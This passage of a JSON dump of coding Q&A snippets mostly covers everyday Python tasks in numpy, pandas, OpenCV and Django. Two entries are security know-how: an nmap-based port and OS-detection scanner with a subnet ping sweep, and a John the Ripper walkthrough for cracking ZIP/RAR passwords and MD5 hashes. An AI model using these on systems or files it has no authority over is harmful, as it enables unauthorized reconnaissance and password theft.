    "description": "extends KinematicBody2D  var velocity = Vector2.ZERO  func _physics_process(delta): \tif Input. is_action_pressed(\"ui_right\"): \t\tposition.x += 4 \telif Input. is_action_pressed(\"ui_left\"): \t\tposition.x -= 4 \telif Input. is_action_pressed(\"ui_up\"): \t\tposition.y -= 4 \telif Input. is_action_pressed(\"ui_down\"): \t\tposition.y += 4  \tmove_and_collide(velocity)   #this one it the best and most simple one\n#3d extends KinematicBody  var speed = 200 var motion = Vector2()  func _physics_process(delta): \tif Input. is_action_pressed(\"ui_right\"): \t\tmotion.x += speed \telif Input. is_action_pressed(\"ui_left\"): \t\tmotion.x -= speed \telif Input. is_action_pressed(\"ui_up\"): \t\tmotion.z -= speed \telif Input. is_action_pressed(\"ui_down\"): \t\tmotion.z += speed \telse: \t\tmotion.x = 0 \t\t  \tmove_and_collide(motion)\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2415,
    "keyword": null,
    "link": null,
    "title": " moving average numpy",
    "description": "def moving_average(a, n=3) :     ret = np.cumsum(a, dtype=float)     ret[n:] = ret[n:] - ret[:-n]     return ret[n - 1:] / n  >>> a = np.arange(20) >>> moving_average(a) array([  1.,   2.,   3.,   4.,   5.,   6.,   7.,   8.,   9.,  10.,  11.,         12.,  13.,  14.,  15.,  16.,  17.,  18.]) >>> moving_average(a, n=4) array([  1.5,   2.5,   3.5,   4.5,   5.5,   6.5,   7.5,   8.5,   9.5,         10.5,  11.5,  12.5,  13.5,  14.5,  15.5,  16.5,  17.5]) \n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2416,
    "keyword": null,
    "link": null,
    "title": " mp4 get all images frame by frame python",
    "description": "import cv2 vidcap = cv2.VideoCapture('big_buck_bunny_720p_5mb.mp4') success,image = vidcap.read() count = 0 while success:   cv2.imwrite(\"frame%d.jpg\" % count, image)     # save frame as JPEG file         success,image = vidcap.read()   print('Read a new frame: ', success)   count += 1\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2417,
    "keyword": null,
    "link": null,
    "title": " mplfinance import candlestick",
    "description": "      from mplfinance.original_flavor import candlestick_ohlc\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2418,
    "keyword": null,
    "link": null,
    "title": " multi split python",
    "description": "str = 'Lorem; ipsum. dolor sit amet, consectetur adipiscing elit.' str = str.split(',') print(str) # Output ['Lorem; ipsum. dolor sit amet', ' consectetur adipiscing elit.']  import re str = 'Lorem; ipsum. dolor sit amet, consectetur adipiscing elit.' str = re.split(r';|,|\\.', str) print(str) # Output ['Lorem', ' ipsum', ' dolor sit amet', ' consectetur adipiscing elit', '']\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2419,
    "keyword": null,
    "link": null,
    "title": " multiline input in python",
    "description": "print(\"Enter the array:\\n\")    userInput = input().splitlines() print(userInput)\nimport sys userInput = sys.stdin.readlines()\nlines = [] while True:     line = input()     if line:         lines.append(line)     else:         break text = '\\n'.join(lines) \n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2420,
    "keyword": null,
    "link": null,
    "title": " multipl excel sheets in pandas",
    "description": "xls = pd.ExcelFile('path_to_file.xls') df1 = pd.read_excel(xls, 'Sheet1') df2 = pd.read_excel(xls, 'Sheet2') \n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2421,
    "keyword": null,
    "link": null,
    "title": " multiple axes plotly with title",
    "description": "import plotly.graph_objects as go from plotly.subplots import make_subplots  # Create figure with secondary y-axis fig = make_subplots(specs=[[{\"secondary_y\": True}]])  # Add traces fig.add_trace(     go.Scatter(x=[1, 2, 3], y=[40, 50, 60], name=\"yaxis data\"),     secondary_y=False, )  fig.add_trace(     go.Scatter(x=[2, 3, 4], y=[4, 5, 6], name=\"yaxis2 data\"),     secondary_y=True, )  # Add figure title fig.update_layout(     title_text=\"Double Y Axis Example\" )  # Set x-axis title fig.update_xaxes(title_text=\"xaxis title\")  # Set y-axes titles fig.update_yaxes(title_text=\"<b>primary</b> yaxis title\", secondary_y=False) fig.update_yaxes(title_text=\"<b>secondary</b> yaxis title\", secondary_y=True, showgrid=False)  fig.show()\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2422,
    "keyword": null,
    "link": null,
    "title": " multiply column of dataframe by number",
    "description": "#Multiply the values of column_name by 100 df.column_name.mul(100)\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2423,
    "keyword": null,
    "link": null,
    "title": " mutable and immutable in python",
    "description": "IMMUTABLE datatypes (e.g. int, float, bool, str, tuple, unicode) cant be changed after they are created,  MUTABLE datatypes (e.g. list, set, dict, byte array) can be changed\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2424,
    "keyword": null,
    "link": null,
    "title": " my django template doesnt want to load the static file",
    "description": "STATIC_URL = '/static/' STATIC_ROOT = os.path.join(BASE_DIR, \"/static/\")  STATICFILES_DIRS = (      STATIC_ROOT,         ) \nSTATICFILES_DIRS = [BASE_DIR / 'static']\n<html>     <head>        {% load staticfiles %} <!-- Prepare django to load static files -->     </head>     <body>         <img src={% static \"image.jpg\" %}>     </body> </html>\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2425,
    "keyword": null,
    "link": null,
    "title": " my python app is not quittting",
    "description": "import sys  sys.exit()\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2426,
    "keyword": null,
    "link": null,
    "title": " mysql.connector.errors.NotSupportedError: Authentication plugin 'caching sha2 password' is not supported",
    "description": "You have probably installed mysql-connector instead of mysql-connector-python. So you need to install it again for python3:  pip3 install mysql-connector-python \n#To resolve this error just add auth_plugin  import mysql.connector  mydb = mysql.connector.connect(   host=\"localhost\",   user=\"username\",   password=\"password\",   database=\"db name\",   auth_plugin='mysql_native_password' )\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2427,
    "keyword": null,
    "link": null,
    "title": " mysql to df",
    "description": "import mysql.connector import pandas as pd  db_connection = mysql.connector.connect(   host=\"localhost\",   user=\"user\",   password=\"password\",   database=\"dbname\",   auth_plugin='mysql_native_password' )  df = pd.read_sql(\"select * from table_name;\", con=db_connection) print(df) \nfrom sqlalchemy import create_engine import pymysql  db_connection_str = 'mysql+pymysql://mysql_user:mysql_password@mysql_host/mysql_db' db_connection = create_engine(db_connection_str)  df = pd.read_sql('SELECT * FROM table_name', con=db_connection)  # This works with \"mysql.connector\" as well\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2428,
    "keyword": null,
    "link": null,
    "title": " não nulo pandas",
    "description": "df=df[df[\"COL\"].notna()]\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2429,
    "keyword": null,
    "link": null,
    "title": " n-largest and n-smallest in list in python",
    "description": "import heapq  grades = [110, 25, 38, 49, 20, 95, 33, 87, 80, 90]  print(heapq.nlargest(3, grades)) print(heapq.nsmallest(4, grades))  [110, 95, 90] [20, 25, 33, 38]\n#Exercise 3 -  Find the largest and smallest number in a list thislist = input(\"How many numbers do you want to enter:\") newlist = [] for x in range (0, int(thislist)):  owl = int(input(\"Please Enter your numbers:\"))  newlist.append(owl) print (\"The max number entered is:\", max(newlist)) print (\"The min number entered is:\", min(newlist))\nthislist = [677,8765,8765,876,470,754,6784,56789,7658,] thislist.sort() print (\"The smallest number is: \" + str(thislist[0])) print (\"The largest number is: \" + str(thislist[-1]))\n",
    "reg_date": "2021-10-12T11:31:44.000Z"
  },
  {
    "id": 2430,
    "keyword": null,
    "link": null,
    "title": " n random numbers python",
    "description": ">>> import random >>> random.sample(range(1, 100), 3) [77, 52, 45] \n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2431,
    "keyword": null,
    "link": null,
    "title": " n unique random numbers in python",
    "description": ">>> import random >>> random.sample(range(1, 100), 3) [77, 52, 45] \n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2432,
    "keyword": null,
    "link": null,
    "title": " name 'glob' is not defined",
    "description": "import glob\n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2433,
    "keyword": null,
    "link": null,
    "title": " name plotly axis",
    "description": "import plotly.graph_objects as go  fig = go.Figure()  fig.update_layout(     title=\"Plot Title\",     xaxis_title=\"x Axis Title\",     yaxis_title=\"y Axis Title\",     font=dict(         family=\"Courier New, monospace\",         size=18,         color=\"#7f7f7f\"     ) )  fig.show()\n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2434,
    "keyword": null,
    "link": null,
    "title": " name unnamed column pandas",
    "description": "data.rename( columns={'Unnamed: 0':'new column name'}, inplace=True )\n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2435,
    "keyword": null,
    "link": null,
    "title": " ndarray to list",
    "description": "import numpy as np >>> np.array([[1,2,3],[4,5,6]]).tolist() [[1, 2, 3], [4, 5, 6]] \na = np.array([1, 2]) a.tolist()\n>>> a = np.array([1, 2]) >>> list(a) [1, 2] >>> a.tolist() [1, 2] \n# Basic syntax: numpy_array.tolist()  # Example usage: your_array = np.array([[1, 2, 3], [4, 5, 6]]) your_array --> array([[1, 2, 3],            [4, 5, 6]])  your_array.tolist() --> [[1, 2, 3], [4, 5, 6]]\na = np.array([1, 2]) list(a)\n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2436,
    "keyword": null,
    "link": null,
    "title": " ndarray to pil image",
    "description": "from PIL import Image image_from_array = Image.fromarray(nd_array)\n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2437,
    "keyword": null,
    "link": null,
    "title": " negative cv2",
    "description": "imagem = cv2.bitwise_not(imagem)\n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2438,
    "keyword": null,
    "link": null,
    "title": " negative lookbehind javascript",
    "description": "(?=foo)\tLookahead\tAsserts that what immediately follows the current position in the string is foo (?<=foo)\tLookbehind\tAsserts that what immediately precedes the current position in the string is foo (?!foo)\tNegative Lookahead\tAsserts that what immediately follows the current position in the string is not foo (?<!foo)\tNegative Lookbehind\tAsserts that what immediately precedes the current position in the string is not foo \n",
    "reg_date": "2021-10-12T11:31:45.000Z"
  },
  {
    "id": 2439,
    "keyword": null,
    "link": null,
    "title": " networkx remove nodes with degree",
    "description": "import networkx  G1 = networkx.Graph() G1.add_edges_from([('a','b'),('b','c'),('c','e'),('c','d'),('c','f'),('c','g')]) to_be_removed = [x for  x in G1.nodes() if G1.degree(x) <= 1]  for x in to_be_removed:     G1.remove_node(x)  print(G1.edges())\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2440,
    "keyword": null,
    "link": null,
    "title": " new column with age interval pandas",
    "description": "df_ages['age_bins'] = pd.cut(x=df_ages['age'], bins=[20, 29, 39, 49]) \n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2441,
    "keyword": null,
    "link": null,
    "title": " new event loop asyncio",
    "description": "import asyncio  async def foo(loop):     print('foo')     loop.stop()  loop = asyncio.new_event_loop() asyncio.set_event_loop(loop) # <---- asyncio.ensure_future(foo(loop)) loop.run_forever() \n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2442,
    "keyword": null,
    "link": null,
    "title": " new working version of linkchecker",
    "description": "pip3 install git+https://github.com/linkchecker/linkchecker.git\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2443,
    "keyword": null,
    "link": null,
    "title": " next prime number in python",
    "description": "#add this code to your code and call \"nextprime(number)\" def nextprime(n): \tprime=0 \tn+=1 \tfor i in range(2,int(n**0.5)+2): \t\tif n%i==0: \t\t\tprime=0 \t\t\tbreak \t\telse: \t\t\tprime=1 \tif prime==1: \t\tprint(n) \t\treturn \telse: \t\tnextprime(n) \t\treturn\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2444,
    "keyword": null,
    "link": null,
    "title": " nice python turtle code",
    "description": "print(\"start test\")  for i in range(4):     print(i)     print(\"test\")      print(\"end test 1\")  for banana in range(20):     print(banana)     print(banana * 2)\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2445,
    "keyword": null,
    "link": null,
    "title": " nltk in python",
    "description": "pip install nltk\npip install nltk import nltk nltk.download()\nimport nltk from nltk.stem.lancaster import LancasterStemmer stemmer = LancasterStemmer()   \nimport nltk\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2446,
    "keyword": null,
    "link": null,
    "title": " nltk pip",
    "description": "pip install nltk\n# on Window : press [window] + [R] # in the search bar write cmd   pip install --user -U nltk\nimport nltk\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2447,
    "keyword": null,
    "link": null,
    "title": " nmap pyhton",
    "description": "import nmap   scanner = nmap.PortScanner()   ip_addr = '127.0.0.1'   response = input(\"\"\"\\nPlease enter the type of scan you want to run                 1)SYN ACK Scan                 2)UDP Scan                 3)Comprehensive Scan                 4)Regular Scan                 5. OS Detection                 6. Multiple IP inputs                 7. Ping Scan\\n\"\"\") print(\"You have selected option: \", response)   # If user's input is 1, perform a SYN/ACK scan if response == '1':     print(\"Nmap Version: \", scanner.nmap_version())     # Here, v is used for verbose, which means if selected it will give extra information     # 1-1024 means the port number we want to search on     #-sS means perform a TCP SYN connect scan, it send the SYN packets to the host     scanner.scan(ip_addr,'1-1024', '-v -sS')     print(scanner.scaninfo())     # state() tells if target is up or down     print(\"Ip Status: \", scanner[ip_addr].state())     # all_protocols() tells which protocols are enabled like TCP UDP etc     print(\"protocols:\",scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       # If user's input is 2, perform a UDP Scan    elif response == '2':     # Here, v is used for verbose, which means if selected it will give #extra information     # 1-1024 means the port number we want to search on     #-sU means perform a UDP SYN connect scan, it send the SYN packets to #the host     print(\"Nmap Version: \", scanner.nmap_version())     scanner.scan(ip_addr, '1-1024', '-v -sU')     print(scanner.scaninfo())     # state() tells if target is up or down     print(\"Ip Status: \", scanner[ip_addr].state())     # all_protocols() tells which protocols are enabled like TCP UDP etc     print(\"protocols:\",scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['udp'].keys())       # If user's input is 3, perform a Comprehensive scan elif response == '3':     print(\"Nmap Version: \", scanner.nmap_version())     # sS for SYN scan, sv probe open ports to determine what service and version they are running on     # O determine OS type, A tells Nmap to make an effort in identifying the target OS     scanner.scan(ip_addr, '1-1024', '-v -sS -sV -sC -A -O')     print(scanner.scaninfo())     print(\"Ip Status: \", scanner[ip_addr].state())     print(scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       # If user's input is 4, perform a Regular Scan elif response == '4':     # Works on default arguments     scanner.scan(ip_addr)     print(scanner.scaninfo())     print(\"Ip Status: \", scanner[ip_addr].state())     print(scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       elif response == '5':     print(scanner.scan(\"127.0.0.1\", arguments=\"-O\")['scan']['127.0.0.1']['osmatch'][1])   elif response == '6':     ip_addr = input()     print(\"Nmap Version: \", scanner.nmap_version())     # Here, v is used for verbose, which means if selected it will give extra information     # 1-1024 means the port number we want to search on     #-sS means perform a TCP SYN connect scan, it send the SYN packets to the host     scanner.scan(ip_addr,'1-1024', '-v -sS')     print(scanner.scaninfo())     # state() tells if target is up or down     print(\"Ip Status: \", scanner[ip_addr].state())     # all_protocols() tells which protocols are enabled like TCP UDP etc     print(\"protocols:\",scanner[ip_addr].all_protocols())     print(\"Open Ports: \", scanner[ip_addr]['tcp'].keys())       elif response == '7':      scanner.scan(hosts='192.168.1.0/24', arguments='-n -sP -PE -PA21,23,80,3389')     hosts_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts()]     for host, status in hosts_list:         print('{0}:{1}'.format(host, status))       else:     print(\"Please choose a number from the options above\") \n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2448,
    "keyword": null,
    "link": null,
    "title": " no module named cv2",
    "description": "To solve this run the following # main opencv pip install opencv-python # contrib package for the extra features pip install opencv-contrib-python  The official installation instructions are on the opencv website. More info can be found here:  https://www.pyimagesearch.com/opencv-tutorials-resources-guides/\n#To get out of this problem write pip install opencv-python  #in your terminal\npython -m pip install opencv-python \npython -m pip install opencv-python\nsudo apt-get install python-opencv libopencv-dev python-numpy python-dev\n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2449,
    "keyword": null,
    "link": null,
    "title": " no module psycopg2",
    "description": "# For quick install pip install psycopg2-binary  # For production-ready install pip install psycopg2 # But it will fail if build prerequesties are not met: # https://www.psycopg.org/docs/install.html#build-prerequisites\npip install psycopg2\n$ pip install psycopg2  # or $ pipenv install psycopg2\npip install psycopg2  \n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2450,
    "keyword": null,
    "link": null,
    "title": " no password hashes loaded (see faq)",
    "description": "Cracking Password Protected ZIP/RAR Files First, go to the directory of the file. I will assume that everyone here can do that. After, use this command :  zip2john zipfile > output.txt  (If it is a RAR file, replace the zip in the front to rar.)  Replace the \"zipfile\" with the name of the zip file you are trying to crack and replace the \"output.txt\" with any name that is a .txt format.  After that command, you will see that it would have maked a text file. The hashes are stored in that file. To crack the hash, type :  john --format=zip hashfilepath  Again, replace the \"hashfilepath\" to yours. Mine is just an example. Now, wait, and you can see it is cracked.  Cracking Passwords Using John the Ripper Now go in the zip file and put the password.  Decrypting MD5 Hash I have my Hash over here :  Cracking Passwords Using John the Ripper Now, lets use john to decrypt it. To decrypt it, use this :  john --format=raw-md5 hashfilepath  Again, repl...... I won't say it. And now enter, and should take a while and it will decrypt it.  Cracking Passwords Using John the Ripper And boom.  Using Wordlists to Crack Passwords I don't really recommend this one, but there are some peoples out there using this to crack... I will crack a hash that is inside a text file. I have a wordlist here, and I named it password.txt. To use the wordlist and crack the file, do :  john --format=raw-shal --wordlist password.txt THEHASHFILE.txt  You know what you gotta do. \n",
    "reg_date": "2021-10-12T11:31:46.000Z"
  },
  {
    "id": 2451,
    "keyword": null,
    "link": null,
    "title": " no such table: django session",
    "description": "# try running the following code from your project directory python manage.py migrate\n#check for migrations python manage.py makemigrations  #make migrations python manage.py migrate\npython ./manage.py migrate  python ./manage.py makemigrations\n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2452,
    "keyword": null,
    "link": null,
    "title": " normalise list python",
    "description": ">>> a = [2,4,10,6,8,4] >>> amin, amax = min(a), max(a) >>> for i, val in enumerate(a): ...     a[i] = (val-amin) / (amax-amin) ... >>> a [0.0, 0.25, 1.0, 0.5, 0.75, 0.25] \n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2453,
    "keyword": null,
    "link": null,
    "title": " normalize = true pandas",
    "description": "#1  normalize = True  2 #With normalize set to True, returns the relative frequency by dividing all values by the sum of values. normalize = True \ndf.value_counts(normalize=True) \n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2454,
    "keyword": null,
    "link": null,
    "title": " normalize data python",
    "description": ">>> from sklearn import preprocessing >>> >>> data = [100, 10, 2, 32, 31, 949] >>> >>> preprocessing.normalize([data]) array([[0.10467389, 0.01046739, 0.00209348, 0.03349564, 0.03244891,0.99335519]]) \nimport pandas as pd from sklearn import preprocessing  x = df.values #returns a numpy array min_max_scaler = preprocessing.MinMaxScaler() x_scaled = min_max_scaler.fit_transform(x) df = pd.DataFrame(x_scaled)\n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2455,
    "keyword": null,
    "link": null,
    "title": " normalize data python pandas",
    "description": ">>> from sklearn import preprocessing >>> >>> data = [100, 10, 2, 32, 31, 949] >>> >>> preprocessing.normalize([data]) array([[0.10467389, 0.01046739, 0.00209348, 0.03349564, 0.03244891,0.99335519]]) \nimport pandas as pd from sklearn import preprocessing  x = df.values #returns a numpy array min_max_scaler = preprocessing.MinMaxScaler() x_scaled = min_max_scaler.fit_transform(x) df = pd.DataFrame(x_scaled)\n# define a method to scale data, looping thru the columns, and passing a scaler def scale_data(data, columns, scaler):     for col in columns:         data[col] = scaler.fit_transform(data[col].values.reshape(-1, 1))     return data\n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2456,
    "keyword": null,
    "link": null,
    "title": " not scientific notation python",
    "description": "df[\"price\"].describe().apply(lambda x: format(x, 'f'))\n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2457,
    "keyword": null,
    "link": null,
    "title": " not x axis labels python",
    "description": "plt.gca().axes.get_xaxis().set_visible(False) plt.gca().axes.get_yaxis().set_visible(False)\n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2458,
    "keyword": null,
    "link": null,
    "title": " np.argsort reverse",
    "description": "arr.argsort()[::-1]\navgDists.argsort()[::-1][:n]\n",
    "reg_date": "2021-10-12T11:31:47.000Z"
  },
  {
    "id": 2459,
    "keyword": null,
    "link": null,
    "title": " np.load",
    "description": "np.save('data.npy', num_arr) # save new_num_arr = np.load('data.npy') # load\n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2460,
    "keyword": null,
    "link": null,
    "title": " np.ndarray.tolist",
    "description": "import numpy as np >>> np.array([[1,2,3],[4,5,6]]).tolist() [[1, 2, 3], [4, 5, 6]] \n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2461,
    "keyword": null,
    "link": null,
    "title": " np.random.float",
    "description": "numpy.random.uniform(low=0.0, high=1.0, size=None)\n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2462,
    "keyword": null,
    "link": null,
    "title": " np.random.seed",
    "description": "import numpy as np np.random.seed(42) random_numbers = np.random.random(size=4) random_numbers \n>>> import numpy as np >>>  >>> np.random.seed(0) >>>  >>> np.random.rand(3) array([0.5488135 , 0.71518937, 0.60276338]) >>> np.random.rand(3) array([0.54488318, 0.4236548 , 0.64589411]) >>>  >>>  >>> np.random.seed(1) >>>  >>> np.random.rand(3) array([4.17022005e-01, 7.20324493e-01, 1.14374817e-04]) >>> np.random.rand(3) array([0.30233257, 0.14675589, 0.09233859]) >>>  >>>  >>> np.random.seed(0) >>>  >>> np.random.rand(3) array([0.5488135 , 0.71518937, 0.60276338]) >>> np.random.rand(3) array([0.54488318, 0.4236548 , 0.64589411])\nnumpy.random.seed()\nnp.random.seed(0) np.random.randint(10, size = 5)\n>>> numpy.random.seed(0) ; numpy.random.rand(4) array([ 0.55,  0.72,  0.6 ,  0.54]) >>> numpy.random.seed(0) ; numpy.random.rand(4) array([ 0.55,  0.72,  0.6 ,  0.54]) \narray([0.3745012, 0.95071431, 0.73199394, 0.59865848]) \n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2463,
    "keyword": null,
    "link": null,
    "title": " np.random.uniform",
    "description": "numpy.random.uniform(low=0.0, high=1.0, size=None)\n#In contrast to randInt .random.uniform generates a floating number between two variables # imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100))\n>>> 2.5 * np.random.randn(2, 4) + 3 array([[-4.49401501,  4.00950034, -1.81814867,  7.29718677],  #random        [ 0.39924804,  4.68456316,  4.99394529,  4.84057254]]) #random \n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2464,
    "keyword": null,
    "link": null,
    "title": " np.save function",
    "description": "np.save('data.npy', num_arr) # save new_num_arr = np.load('data.npy') # load\nnp.save('test3.npy', a)    # .npy extension is added if not given d = np.load('test3.npy') a == d # array([ True,  True,  True,  True], dtype=bool)\n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2465,
    "keyword": null,
    "link": null,
    "title": " np.vstack multiple arrays",
    "description": ">>> import numpy as np >>> a = ([1,2,3,4,5]) >>> b = ([2,3,4,5,6]) >>> c = ([3,4,5,6,7])  >>> np.array([a, b, c]) array([[1, 2, 3, 4, 5],        [2, 3, 4, 5, 6],        [3, 4, 5, 6, 7]])  >>> np.stack([a, b, c], axis=0) array([[1, 2, 3, 4, 5],        [2, 3, 4, 5, 6],        [3, 4, 5, 6, 7]])  >>> np.stack([a, b, c], axis=1)  # not what you want, this is only to show what is possible array([[1, 2, 3],        [2, 3, 4],        [3, 4, 5],        [4, 5, 6],        [5, 6, 7]])\n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2466,
    "keyword": null,
    "link": null,
    "title": " np array describe",
    "description": ">>> from scipy import stats >>> a = np.arange(10) >>> stats.describe(a) DescribeResult(nobs=10, minmax=(0, 9), mean=4.5, variance=9.166666666666666,                skewness=0.0, kurtosis=-1.2242424242424244) >>> b = [[1, 2], [3, 4]] >>> stats.describe(b) DescribeResult(nobs=2, minmax=(array([1, 2]), array([3, 4])),                mean=array([2., 3.]), variance=array([2., 2.]),                skewness=array([0., 0.]), kurtosis=array([-2., -2.])) \n",
    "reg_date": "2021-10-12T11:31:48.000Z"
  },
  {
    "id": 2467,
    "keyword": null,
    "link": null,
    "title": " np array n same values",
    "description": ">>> np.full((3, 5), 7) array([[ 7.,  7.,  7.,  7.,  7.],        [ 7.,  7.,  7.,  7.,  7.],        [ 7.,  7.,  7.,  7.,  7.]])  >>> np.full((3, 5), 7, dtype=int) array([[7, 7, 7, 7, 7],        [7, 7, 7, 7, 7],        [7, 7, 7, 7, 7]])\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2468,
    "keyword": null,
    "link": null,
    "title": " np array to wav file",
    "description": "import soundfile as sf sf.write('sound.wav', yourArray, 48000)\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2469,
    "keyword": null,
    "link": null,
    "title": " np array value count",
    "description": "unique_elements, counts_elements = np.unique(a, return_counts=True)\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2470,
    "keyword": null,
    "link": null,
    "title": " np convert to int",
    "description": ">>> x = np.array([[1.0, 2.3], [1.3, 2.9]]) >>> x array([[ 1. ,  2.3],        [ 1.3,  2.9]]) >>> x.astype(int) array([[1, 2],        [1, 2]]) \nint_array = float_array.astype(int)\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2471,
    "keyword": null,
    "link": null,
    "title": " np euclidean distance python",
    "description": "import numpy as np a = np.array((1,1,1)) b = np.array((2,2,2)) dist = np.linalg.norm(a-b) \n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2472,
    "keyword": null,
    "link": null,
    "title": " np float to int",
    "description": ">>> x = np.array([[1.0, 2.3], [1.3, 2.9]]) >>> x array([[ 1. ,  2.3],        [ 1.3,  2.9]]) >>> x.astype(int) array([[1, 2],        [1, 2]]) \nint_array = float_array.astype(int)\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2473,
    "keyword": null,
    "link": null,
    "title": " np in python",
    "description": "import numpy as np\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2474,
    "keyword": null,
    "link": null,
    "title": " np install python",
    "description": "// you should have pip installed  pip install np\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2475,
    "keyword": null,
    "link": null,
    "title": " np logical or",
    "description": ">>> np.logical_or(True, False) True >>> np.logical_or([True, False], [False, False]) array([ True, False])\n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2476,
    "keyword": null,
    "link": null,
    "title": " np vstack",
    "description": ">>> import numpy as np >>> a = ([1,2,3,4,5]) >>> b = ([2,3,4,5,6]) >>> c = ([3,4,5,6,7])  >>> np.array([a, b, c]) array([[1, 2, 3, 4, 5],        [2, 3, 4, 5, 6],        [3, 4, 5, 6, 7]])  >>> np.stack([a, b, c], axis=0) array([[1, 2, 3, 4, 5],        [2, 3, 4, 5, 6],        [3, 4, 5, 6, 7]])  >>> np.stack([a, b, c], axis=1)  # not what you want, this is only to show what is possible array([[1, 2, 3],        [2, 3, 4],        [3, 4, 5],        [4, 5, 6],        [5, 6, 7]])\n>>> a = np.array([1, 2, 3]) >>> b = np.array([2, 3, 4]) >>> np.vstack((a,b)) array([[1, 2, 3],        [2, 3, 4]])         >>> a = np.array([[1], [2], [3]]) >>> b = np.array([[2], [3], [4]]) >>> np.vstack((a,b)) array([[1],        [2],        [3],        [2],        [3],        [4]])\n>>> a = np.array([1, 2, 3]) >>> b = np.array([2, 3, 4]) >>> np.vstack((a,b)) array([[1, 2, 3],        [2, 3, 4]]) \nimport numpy as np a = np.array([1, 2, 3]) b = np.array([2, 3, 4]) np.vstack((a,b))\n>>> a = np.array([[1], [2], [3]]) >>> b = np.array([[2], [3], [4]]) >>> np.vstack((a,b)) array([[1],        [2],        [3],        [2],        [3],        [4]]) \n>>> a = np.array([[1], [2], [3]]) >>> b = np.array([[4], [5], [6]]) >>> np.vstack((a,b)) array([[1],        [2],        [3],        [4],        [5],        [6]]) \n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2477,
    "keyword": null,
    "link": null,
    "title": " npm ERR! gyp ERR! stack Error: Can't find Python executable \"python\", you can set the PYTHON env variable.",
    "description": "npm --add-python-to-path='true' --debug install --global windows-build-tools \n",
    "reg_date": "2021-10-12T11:31:49.000Z"
  },
  {
    "id": 2478,
    "keyword": null,
